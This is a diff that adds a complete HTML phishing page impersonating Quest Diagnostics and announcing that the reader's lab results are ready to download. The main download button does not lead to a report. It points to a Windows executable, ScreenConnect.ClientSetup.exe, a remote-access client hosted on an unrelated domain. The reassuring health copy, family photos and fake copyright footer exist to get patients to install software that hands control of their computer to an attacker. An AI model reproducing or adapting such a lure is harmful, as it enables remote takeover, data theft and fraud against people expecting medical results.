@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>GreenLab Services | Download Center</title>
+	<style type="text/css">:root {
+            --green-dark: #064e3b;
+            --green: #087a4b;
+            --green-light: #10b981;
+            --green-pale: #ecfdf5;
+            --text: #18352b;
+            --muted: #6b7c74;
+            --border: #dfeae5;
+            --bg: #f5f8f7;
+            --white: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+        }
+
+        /* HEADER */
+
+        header {
+            height: 76px;
+            background: white;
+            border-bottom: 1px solid var(--border);
+
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+
+            padding: 0 7%;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 42px;
+            height: 42px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            border-radius: 11px;
+
+            color: white;
+            font-size: 23px;
+            font-weight: bold;
+
+            background: linear-gradient(
+                135deg,
+                var(--green-dark),
+                var(--green-light)
+            );
+
+            box-shadow: 0 6px 15px rgba(8,122,75,.2);
+        }
+
+        .logo-text {
+            color: var(--green-dark);
+            font-size: 19px;
+            font-weight: 800;
+        }
+
+        nav {
+            display: flex;
+            gap: 30px;
+        }
+
+        nav a {
+            color: #53665e;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        nav a:hover {
+            color: var(--green);
+        }
+
+        /* HERO */
+
+        .hero {
+            position: relative;
+            overflow: hidden;
+
+            min-height: 500px;
+
+            background:
+                linear-gradient(
+                    90deg,
+                    rgba(4,78,59,.96),
+                    rgba(6,120,82,.84)
+                ),
+                url("https://images.unsplash.com/photo-1584515933487-779824d29309?auto=format&fit=crop&w=1800&q=85")
+                center / cover;
+
+            color: white;
+
+            display: flex;
+            align-items: center;
+        }
+
+        .hero-content {
+            width: 100%;
+            max-width: 1150px;
+
+            margin: auto;
+            padding: 70px 30px;
+
+            display: grid;
+            grid-template-columns: 1.1fr .9fr;
+            gap: 60px;
+
+            align-items: center;
+        }
+
+        .eyebrow {
+            display: inline-block;
+
+            padding: 8px 14px;
+
+            border-radius: 30px;
+
+            background: rgba(255,255,255,.1);
+            border: 1px solid rgba(255,255,255,.2);
+
+            color: #d8f8e9;
+
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+
+            font-size: 11px;
+            font-weight: bold;
+
+            margin-bottom: 20px;
+        }
+
+        .hero h1 {
+            font-size: clamp(38px, 5vw, 58px);
+            line-height: 1.08;
+
+            letter-spacing: -1.5px;
+
+            margin-bottom: 20px;
+        }
+
+        .hero p {
+            max-width: 620px;
+
+            color: #dcf6e9;
+
+            font-size: 17px;
+            line-height: 1.75;
+
+            margin-bottom: 30px;
+        }
+
+        /* HERO PHOTO */
+
+        .people-image {
+            position: relative;
+
+            height: 350px;
+
+            border-radius: 20px;
+
+            overflow: hidden;
+
+            box-shadow: 0 25px 60px rgba(0,0,0,.22);
+
+            border: 1px solid rgba(255,255,255,.2);
+        }
+
+        .people-image img {
+            width: 100%;
+            height: 100%;
+
+            object-fit: cover;
+        }
+
+        .photo-label {
+            position: absolute;
+
+            left: 18px;
+            bottom: 18px;
+
+            padding: 9px 13px;
+
+            border-radius: 8px;
+
+            background: rgba(4,78,59,.88);
+
+            color: white;
+
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* MAIN */
+
+        main {
+            max-width: 760px;
+
+            margin: -65px auto 70px;
+
+            padding: 0 20px;
+
+            position: relative;
+            z-index: 5;
+        }
+
+        .card {
+            background: white;
+
+            border: 1px solid var(--border);
+
+            border-radius: 17px;
+
+            padding: 40px;
+
+            box-shadow: 0 25px 65px rgba(7,78,59,.13);
+        }
+
+        .available {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+
+            padding: 7px 12px;
+
+            border-radius: 30px;
+
+            background: var(--green-pale);
+            border: 1px solid #ccefe0;
+
+            color: var(--green-dark);
+
+            font-size: 12px;
+            font-weight: bold;
+
+            margin-bottom: 20px;
+        }
+
+        .available-dot {
+            width: 7px;
+            height: 7px;
+
+            border-radius: 50%;
+
+            background: var(--green-light);
+        }
+
+        .card h2 {
+            color: var(--green-dark);
+
+            font-size: 29px;
+
+            margin-bottom: 10px;
+        }
+
+        .description {
+            color: var(--muted);
+
+            font-size: 15px;
+            line-height: 1.7;
+
+            margin-bottom: 28px;
+        }
+
+        /* DEVICE */
+
+        .device {
+            background: linear-gradient(
+                135deg,
+                #f0faf5,
+                #e5f7ee
+            );
+
+            border: 1px solid #d5eee1;
+
+            border-radius: 14px;
+
+            padding: 25px;
+
+            margin-bottom: 25px;
+
+            display: flex;
+            align-items: center;
+            gap: 25px;
+        }
+
+        .device-image {
+            width: 135px;
+            height: 135px;
+
+            border-radius: 12px;
+
+            object-fit: cover;
+
+            box-shadow: 0 8px 20px rgba(6,78,59,.12);
+        }
+
+        .device-info h3 {
+            color: var(--green-dark);
+
+            font-size: 19px;
+
+            margin-bottom: 7px;
+        }
+
+        .device-info p {
+            color: var(--muted);
+
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        /* FILE */
+
+        .file {
+            border: 1px solid var(--border);
+
+            border-radius: 12px;
+
+            overflow: hidden;
+
+            margin-bottom: 25px;
+        }
+
+        .file-header {
+            padding: 15px 18px;
+
+            background: #f4f9f6;
+
+            border-bottom: 1px solid var(--border);
+
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .file-header strong {
+            color: var(--green-dark);
+            font-size: 13px;
+        }
+
+        .extension {
+            padding: 5px 9px;
+
+            border-radius: 5px;
+
+            background: #d9f6e8;
+
+            color: var(--green-dark);
+
+            font-size: 10px;
+            font-weight: 800;
+        }
+
+        .file-body {
+            padding: 5px 18px;
+        }
+
+        .row {
+            display: flex;
+
+            justify-content: space-between;
+
+            gap: 20px;
+
+            padding: 14px 0;
+
+            font-size: 14px;
+        }
+
+        .row + .row {
+            border-top: 1px solid #edf2ef;
+        }
+
+        .label {
+            color: #7c8c85;
+        }
+
+        .value {
+            color: #294238;
+
+            font-weight: 600;
+
+            text-align: right;
+
+            word-break: break-word;
+        }
+
+        /* DOWNLOAD */
+
+        .download {
+            width: 100%;
+            min-height: 56px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            gap: 11px;
+
+            background: linear-gradient(
+                135deg,
+                var(--green),
+                var(--green-light)
+            );
+
+            color: white;
+
+            border-radius: 9px;
+
+            text-decoration: none;
+
+            font-size: 16px;
+            font-weight: 700;
+
+            box-shadow: 0 8px 20px rgba(5,150,105,.23);
+
+            transition: .2s ease;
+        }
+
+        .download:hover {
+            transform: translateY(-2px);
+
+            box-shadow: 0 13px 28px rgba(5,150,105,.3);
+        }
+
+        .download-icon {
+            font-size: 21px;
+        }
+
+        .notice {
+            margin-top: 17px;
+
+            color: #829089;
+
+            font-size: 12px;
+
+            line-height: 1.6;
+        }
+
+        /* FAMILY SECTION */
+
+        .family {
+            max-width: 1150px;
+
+            margin: 0 auto 80px;
+
+            padding: 0 20px;
+        }
+
+        .family-heading {
+            text-align: center;
+
+            margin-bottom: 30px;
+        }
+
+        .family-heading h2 {
+            color: var(--green-dark);
+
+            font-size: 30px;
+
+            margin-bottom: 8px;
+        }
+
+        .family-heading p {
+            color: var(--muted);
+
+            font-size: 14px;
+        }
+
+        .people-grid {
+            display: grid;
+
+            grid-template-columns: repeat(3, 1fr);
+
+            gap: 20px;
+        }
+
+        .person {
+            background: white;
+
+            border: 1px solid var(--border);
+
+            border-radius: 13px;
+
+            overflow: hidden;
+
+            box-shadow: 0 8px 25px rgba(6,78,59,.06);
+        }
+
+        .person img {
+            width: 100%;
+            height: 230px;
+
+            object-fit: cover;
+
+            display: block;
+        }
+
+        .person-info {
+            padding: 18px;
+        }
+
+        .person-info h3 {
+            color: var(--green-dark);
+
+            font-size: 16px;
+
+            margin-bottom: 5px;
+        }
+
+        .person-info p {
+            color: var(--muted);
+
+            font-size: 13px;
+        }
+
+        /* FOOTER */
+
+        footer {
+            background: #043c2d;
+
+            color: #b7d4c8;
+
+            text-align: center;
+
+            padding: 38px 20px;
+
+            font-size: 12px;
+        }
+
+        .footer-brand {
+            color: white;
+
+            font-size: 16px;
+            font-weight: 800;
+
+            margin-bottom: 10px;
+        }
+
+        .footer-line {
+            width: 42px;
+            height: 2px;
+
+            background: var(--green-light);
+
+            margin: 14px auto;
+        }
+
+        /* MOBILE */
+
+        @media (max-width: 800px) {
+
+            nav {
+                display: none;
+            }
+
+            .hero-content {
+                grid-template-columns: 1fr;
+            }
+
+            .people-image {
+                height: 280px;
+            }
+
+            main {
+                margin-top: -45px;
+            }
+
+            .card {
+                padding: 27px 20px;
+            }
+
+            .device {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .people-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .row {
+                flex-direction: column;
+                gap: 5px;
+            }
+
+            .value {
+                text-align: left;
+            }
+        }
+	</style>
+</head>
+<body><!-- HEADER -->
+<header>
+<div class="logo">
+<div class="logo-icon">
+<div style="color: rgb(0, 0, 0); font-family: inherit; font-style: inherit; background-color: rgb(255, 255, 255); text-align: center; scrollbar-color: rgba(255, 255, 255, 0.6) rgba(0, 0, 0, 0.6); border-width: 0px; border-style: none; border-color: currentcolor; font-weight: bold; font-size: 28px; line-height: 1; vertical-align: baseline;"><span style="font-size:24px;"><span style="color:#008000;">Quest Diagnostics&reg;&nbsp;</span></span></div>
+</div>
+</div>
+
+<nav><a href="#">Services</a> <a href="#">Resources</a> <a href="#">Support</a></nav>
+</header>
+<!-- HERO -->
+
+<section class="hero">
+<div class="hero-content">
+<div><font color="#d8f8e9"><span style="font-size: 11px; letter-spacing: 1.5px; text-transform: uppercase; background-color: rgba(255, 255, 255, 0.1);"><b>Your Lab Results Are Ready</b></span></font>
+
+<h1>Download Your Lab</h1>
+
+<p>W<span style="color:#FFFFFF;">e wanted to let you know that your recent laboratory results from Quest Diagnostics are now available for secure download.</span></p>
+
+<div style="font-family: verdana, serif, emojifont; scrollbar-color: rgba(255, 255, 255, 0.6) rgba(0, 0, 0, 0.6); border-width: 0px; border-style: none; border-color: currentcolor; font-style: inherit; font-size: 12px; line-height: 1.6; vertical-align: baseline; color: rgb(85, 85, 85);"><span style="color:#FFFFFF;">You can access your report anytime using the secure link below. Reviewing your results promptly can help you stay informed and continue managing your health with confidence.</span></div>
+
+<div style="font-family: verdana, serif, emojifont; scrollbar-color: rgba(255, 255, 255, 0.6) rgba(0, 0, 0, 0.6); border-width: 0px; border-style: none; border-color: currentcolor; font-style: inherit; font-size: 12px; line-height: 1.6; vertical-align: baseline; color: rgb(85, 85, 85);">&nbsp;</div>
+</div>
+
+<div class="people-image"><img alt="Family receiving professional care" src="https://images.unsplash.com/photo-1584515933487-779824d29309?auto=format&amp;fit=crop&amp;w=1000&amp;q=85" />
+<div class="photo-label">Family Laboratory Services</div>
+</div>
+</div>
+</section>
+<!-- DOWNLOAD --><main>
+<section class="card">
+<div class="available">Download Available</div>
+
+<h2>Your Lab Download</h2>
+
+<p class="description">Your update&nbsp;is available below. Please review the information before continuing.</p>
+<!-- DEVICE --><!-- FILE INFORMATION -->
+
+<div class="file">
+<div class="file-header"><strong>Download Information </strong> <span class="extension"> EXE </span></div>
+
+<div class="file-body">
+<div class="row"><span class="label">File name </span> <span class="value">Quest Diagnostics</span></div>
+
+<div class="row"><span class="label">File type </span> <span class="value"> Windows&nbsp;</span></div>
+
+<div class="row"><span class="label">Release </span> <span class="value"> App</span></div>
+</div>
+</div>
+<!-- DOWNLOAD BUTTON --><a class="download" download="" href="https://dash.originalinc-protected.com/te823674782378947238478239748923432/ScreenConnect.ClientSetup.exe"><span class="download-icon">&darr; </span> Download Your Lab </a>
+
+<div class="notice">This download is a Windows executable. Only open executable files from sources you recognize and trust.</div>
+</section>
+</main>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p><!-- FAMILY --></p>
+
+<section class="family">
+<div class="family-heading">
+<h2>Supporting Every Generation</h2>
+
+<p>Professional laboratory services designed with families and communities in mind.</p>
+</div>
+
+<div class="people-grid"><!-- CHILD -->
+<div class="person"><img alt="Child" src="https://images.unsplash.com/photo-1504150558240-0b4fd8946624?auto=format&amp;fit=crop&amp;w=800&amp;q=85" />
+<div class="person-info">
+<h3>Children</h3>
+
+<p>Services designed for families.</p>
+</div>
+</div>
+<!-- OLDER MAN -->
+
+<div class="person"><img alt="Older adult" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&amp;fit=crop&amp;w=800&amp;q=85" />
+<div class="person-info">
+<h3>Adults</h3>
+
+<p>Accessible services for every generation.</p>
+</div>
+</div>
+<!-- OLDER WOMAN -->
+
+<div class="person"><img alt="Older woman" src="https://images.unsplash.com/photo-1551836022-d5d88e9218df?auto=format&amp;fit=crop&amp;w=800&amp;q=85" />
+<div class="person-info">
+<h3>Community</h3>
+
+<p>Convenient access to digital services.</p>
+</div>
+</div>
+</div>
+</section>
+
+<p>&nbsp;</p>
+
+<p><!-- FOOTER --></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<footer>
+<div class="footer-brand"><span style="color:#FFFFFF;"><span style="font-family: arial, sans-serif, serif, emojifont; font-size: 12px; text-align: -webkit-center;">&copy; 2026 Quest Diagnostics Incorporated. All rights reserved.</span></span></div>
+
+<div class="footer-line">&nbsp;</div>
+<span style="color:#FFFFFF;"><span style="font-family: verdana, serif, emojifont; font-size: 12px; text-align: -webkit-center;">Sincerely,</span><br style="color: rgb(85, 85, 85); font-size: 12px; text-align: -webkit-center; background-color: rgb(255, 255, 255); font-family: arial; scrollbar-color: rgba(255, 255, 255, 0.6) rgba(0, 0, 0, 0.6);" />
+<span style="font-family: verdana, serif, emojifont; font-size: 12px; text-align: -webkit-center;">Quest Diagnostics Patient Services Team</span></span></footer>
+</body>
+</html>
